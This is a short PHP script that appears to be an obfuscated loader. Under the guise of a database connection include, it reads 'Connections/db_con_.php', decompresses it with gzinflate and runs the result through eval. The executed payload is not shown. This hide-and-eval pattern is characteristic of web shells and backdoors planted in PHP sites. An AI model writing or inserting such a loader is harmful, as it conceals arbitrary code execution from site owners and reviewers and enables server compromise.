<?php
$connection = file_get_contents('Connections/db_con_.php');
$dataconnector = gzinflate($connection);
eval($dataconnector);
?>